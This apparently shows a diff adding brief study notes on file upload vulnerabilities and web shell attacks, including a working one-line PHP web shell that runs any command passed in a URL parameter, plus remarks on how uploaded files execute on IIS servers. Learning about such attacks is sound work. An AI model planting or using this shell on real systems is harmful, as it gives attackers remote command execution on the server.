@@ -1,0 +1,8 @@
+# 1. Review
+#  - File upload
+#  - Web shell attack
+<?php system($_GET['c']); ?>
+
+#  Windows server : IIS web server
+#    - Uploading exe file = it operates on directly
+#    - Uploading php file = it is able to operate on web server if it know exact path.
